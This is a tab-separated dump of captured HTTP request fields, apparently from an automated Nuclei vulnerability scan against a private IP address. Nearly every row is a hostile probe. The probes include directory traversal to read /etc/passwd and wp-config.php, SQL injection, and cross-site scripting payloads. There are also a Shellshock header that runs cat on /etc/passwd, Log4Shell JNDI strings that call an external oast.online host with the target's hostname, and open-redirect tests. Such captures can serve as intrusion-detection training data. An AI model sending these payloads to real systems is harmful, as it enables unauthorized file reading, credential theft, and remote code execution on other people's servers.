http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/lib///....//....//....//....//....//....//....//....//etc//passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/lib///....//....//....//....//....//....//....//....//etc//passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/download.do?file=../../../../config.text		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/download.do?file=../../../../config.text
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-config.php.swp		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/wp-config.php.swp
	gzip																close		158	158	application/x-www-form-urlencoded; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?action=action_name		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/wp-admin/admin-ajax.php?action=action_name
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/uploads/database-backups/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/wp-content/uploads/database-backups/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/bbpress/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/wp-content/plugins/bbpress/
*/*	gzip	en															close		116	116	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php?action=login.index		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/index.php?action=login.index
	gzip																close		155	155	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/debug.log		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/wp-content/debug.log
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip																close		216	216							192.168.1.104															1	http://192.168.1.104/web/xmlrpc/pingback		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/xmlrpc/pingback
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/bitrix/redirect.php?event1=&event2=&event3=download&goto=https://example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/bitrix/redirect.php?event1=&event2=&event3=download&goto=https://example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=nuclei		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=nuclei
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/
	gzip																close		174	174	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/jolokia/		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/jolokia/
*/*	gzip	en															close		76	76	application/json						192.168.1.104															1	http://192.168.1.104/web/servicedesk/customer/user/signup		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/servicedesk/customer/user/signup
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/bitrix/rk.php?id=28&site_id=s2&event1=banner&event2=click&event3=3+%2F+%5B28%5D+%5BBANNER_AREA_FOOTER2%5D+%D0%9F%D0%BE%D1%81%D0%B5%D1%82%D0%B8%D1%82%D0%B5+%D0%B2%D0%B2%D0%BE%D0%B4%D0%BD%D1%83%D1%8E+%D0%B1%D0%B5%D1%81%D0%BF%D0%BB%D0%B0%D1%82%D0%BD%D1%83%D1%8E+%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D1%8E+APTOS&goto=https://example.com		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/bitrix/rk.php?id=28&site_id=s2&event1=banner&event2=click&event3=3+%2F+%5B28%5D+%5BBANNER_AREA_FOOTER2%5D+%D0%9F%D0%BE%D1%81%D0%B5%D1%82%D0%B8%D1%82%D0%B5+%D0%B2%D0%B2%D0%BE%D0%B4%D0%BD%D1%83%D1%8E+%D0%B1%D0%B5%D1%81%D0%BF%D0%BB%D0%B0%D1%82%D0%BD%D1%83%D1%8E+%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D1%8E+APTOS&goto=https://example.com
*/*	gzip	en															close		0	0							192.168.1.104															1	http://192.168.1.104/web/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?author=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/?author=1
	gzip																close		155	155	application/json						192.168.1.104															1	http://192.168.1.104/web/api/v1/method.callAnon/cve_exploit		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/api/v1/method.callAnon/cve_exploit
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?page=social-metrics-tracker-export&smt_download_export_file=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-admin/admin-ajax.php?page=social-metrics-tracker-export&smt_download_export_file=1
	gzip																close				application/json, text/plain, */*						192.168.1.104															1	http://192.168.1.104/web/api/group/list		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/api/group/list
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5(999999)+--+@`'`		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5(999999)+--+@`'`
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-json/wp/v2/lesson/1		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/wp-json/wp/v2/lesson/1
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/////%5C;@example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/////%5C;@example.com
*/*	gzip	en															close		143	143	text/xml						192.168.1.104															1	http://192.168.1.104/web/hedwig.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36			uid=R8tBjwtFc8	/web/hedwig.cgi
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/etc/passwd
	gzip																close		137	137	application/json; charset=utf-8						192.168.1.104														http://192.168.1.104/manage/account/login?redirect=%2Fmanage	1	http://192.168.1.104/web/api/login		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/api/login
*/*	gzip																close		81	81	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/simple-file-list/ee-file-engine.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/wp-content/plugins/simple-file-list/ee-file-engine.php
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/webtools/control/main		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36			OFBiz.Visitor=${jndi:ldap://${hostName}.c8acjap9m8v98g1htghgcekcu1yyyyyro.oast.online}	/web/webtools/control/main
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-config.php.html		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/wp-config.php.html
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?a=display&templateFile=README.md		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/?a=display&templateFile=README.md
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ReportServer?op=fr_server&cmd=sc_getconnectioninfo		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/ReportServer?op=fr_server&cmd=sc_getconnectioninfo
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip																close		64	64	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/zms/admin/index.php	1	http://192.168.1.104/web/zms/admin/index.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36			PHPSESSID=25SnmNEDI20cQ18LXY80a9qTnV6	/web/zms/admin/index.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/search?search_key=%7B%7B1337*1338%7D%7D		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/search?search_key=%7B%7B1337*1338%7D%7D
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/wp-content/uploads/simple-file-list/nuclei.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/wp-content/uploads/simple-file-list/nuclei.php
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/////example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/////example.com
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/slogin/login.py		GET				HTTP/1.1																			() { :; }; echo ; echo ; /bin/cat /etc/passwd				/web/cgi-bin/slogin/login.py
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/eatery/nav.php?-Menu-=https://example.com/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/wp-content/themes/eatery/nav.php?-Menu-=https://example.com/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.dhtml?sponsor=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/index.dhtml?sponsor=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
	gzip	${jndi:${lower:d}n${lower:s}://${env:hostName}.c8acjap9m8v98g1htghgcekcu1eyyyyr1.oast.online}															close										192.168.1.104															1	http://192.168.1.104/web/portal/info.jsp		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/portal/info.jsp
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/rss-functions.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/wp-includes/rss-functions.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/qcubed/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/qcubed/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/bbpress/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/wp-content/plugins/bbpress/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-config-backup.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-config-backup.txt
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/api/2/dashboard?maxResults=100		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/rest/api/2/dashboard?maxResults=100
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/compress.php?file=../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/compress.php?file=../../../../../../../etc/passwd
*/*	gzip	en															close		116	116	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php?action=login.index		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/index.php?action=login.index
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/lifterlms/		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/wp-content/plugins/lifterlms/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip	en-US,en;q=0.9															close										192.168.1.104															1	http://192.168.1.104/web/?author=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/?author=1
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip																close		216	216							192.168.1.104															1	http://192.168.1.104/web/xmlrpc/pingback		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/xmlrpc/pingback
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/api/sso/v2/sso/jwt?error_url=http://evil.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/api/sso/v2/sso/jwt?error_url=http://evil.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ftb.imagegallery.aspx		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/ftb.imagegallery.aspx
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/api/downloads?fileName=../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/api/downloads?fileName=../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/phpwiki/index.php/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/phpwiki/index.php/passwd
*/*	gzip																close		736	736	multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb						192.168.1.104															1	http://192.168.1.104/web/lib/crud/userprocess.php		POST				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36			PHPSESSID=25SnmNnxdHmcH5IdG1M4hLVDvpp	/web/lib/crud/userprocess.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/bitrix/rk.php?id=28&site_id=s2&event1=banner&event2=click&event3=3+%2F+%5B28%5D+%5BBANNER_AREA_FOOTER2%5D+%D0%9F%D0%BE%D1%81%D0%B5%D1%82%D0%B8%D1%82%D0%B5+%D0%B2%D0%B2%D0%BE%D0%B4%D0%BD%D1%83%D1%8E+%D0%B1%D0%B5%D1%81%D0%BF%D0%BB%D0%B0%D1%82%D0%BD%D1%83%D1%8E+%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D1%8E+APTOS&goto=https://example.com		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/bitrix/rk.php?id=28&site_id=s2&event1=banner&event2=click&event3=3+%2F+%5B28%5D+%5BBANNER_AREA_FOOTER2%5D+%D0%9F%D0%BE%D1%81%D0%B5%D1%82%D0%B8%D1%82%D0%B5+%D0%B2%D0%B2%D0%BE%D0%B4%D0%BD%D1%83%D1%8E+%D0%B1%D0%B5%D1%81%D0%BF%D0%BB%D0%B0%D1%82%D0%BD%D1%83%D1%8E+%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D1%8E+APTOS&goto=https://example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
